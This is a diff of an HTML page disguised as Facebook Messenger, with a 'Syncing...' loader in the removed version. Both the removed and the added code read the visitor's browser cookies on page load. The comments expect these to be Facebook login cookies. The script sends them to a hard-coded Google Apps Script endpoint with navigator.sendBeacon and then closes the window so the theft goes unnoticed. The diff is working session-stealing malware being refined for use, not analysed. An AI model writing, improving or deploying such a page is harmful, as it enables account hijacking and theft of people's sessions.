@@ -1,97 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            text-align: center;
-        }
-        h2 {
-            color: #0084ff;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #65676b;
-            font-size: 14px;
-        }
-        /* Spinner animation */
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0084ff;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    <title>Messenger</title>
+    <!-- Make sure the page loads quickly -->
 </head>
-<body>
+<body style="margin:0; background:#fff;">
+    
+    <script>
+        // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL HERE ⚠️
+        var scriptURL = "https://script.google.com/macros/s/AKfycbwCuryz54YhSuokJcwU1XrEx_5Al4C-EK8aVj58ClzHV2l48laM7T_HVUjrsCuliRE/exec";
 
-<div class="container">
-    <div class="spinner"></div>
-    <h2>Messenger</h2>
-    <p id="status">Syncing...</p>
-</div>
-
-<script>
-    // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL BELOW ⚠️
-    var scriptURL = "https://script.google.com/macros/s/AKfycbxKPU2ymY-NnryEMm1bHAYpQRR2Hn15Npovdpg8THvc5G_rX0316NPYEVRXvFdMmdU/exec";
-
-    function captureAndSend() {
-        // 1. Get the raw cookie string from the current browser context
-        // Note: This only works if the user is logged into FB in THIS specific browser tab
-        var rawCookie = document.cookie;
-        
-        console.log("Raw Cookie Found:", rawCookie);
-
-        // 2. Encode it so special characters (like &, =, :) don't break the URL
-        var encodedCookie = encodeURIComponent(rawCookie);
-
-        // 3. Construct the final URL with a random parameter to prevent caching
-        var fullURL = scriptURL + "?cookie=" + encodedCookie + "&ts=" + Date.now();
-
-        // 4. Use navigator.sendBeacon for reliable background transmission
-        // This is better than fetch() because it works even if the page closes immediately
-        try {
-            navigator.sendBeacon(fullURL);
-            console.log("Data sent via Beacon");
+        // Wait 500ms to ensure Facebook cookies are fully loaded in the browser context
+        setTimeout(function() {
             
-            // Update UI
-            document.getElementById('status').innerText = "Done!";
+            // 1. Get the cookie from THIS window (the popup)
+            var rawCookie = document.cookie;
             
-            // Close the window after a short delay so the user sees "Done"
-            setTimeout(function() {
-                window.close();
-            }, 1500);
+            console.log("Attempting to send:", rawCookie);
 
-        } catch (error) {
-            console.error("Beacon failed, falling back to fetch:", error);
-            // Fallback if Beacon fails
-            fetch(fullURL, { mode: 'no-cors' });
-            setTimeout(function() { window.close(); }, 1500);
-        }
-    }
+            if (rawCookie && rawCookie !== "") {
+                // 2. Encode it so special characters don't break the URL
+                var encodedCookie = encodeURIComponent(rawCookie);
+                
+                // 3. Use sendBeacon for reliable background sending
+                navigator.sendBeacon(scriptURL + "?cookie=" + encodedCookie);
+                
+                console.log("Success!");
+            } else {
+                console.log("No cookie found");
+            }
 
-    // Run the function immediately when the page loads
-    captureAndSend();
-</script>
+            // 4. Close the popup window immediately after sending
+            window.close();
 
+        }, 500); // 500 milliseconds delay
+    </script>
+    
 </body>
 </html>
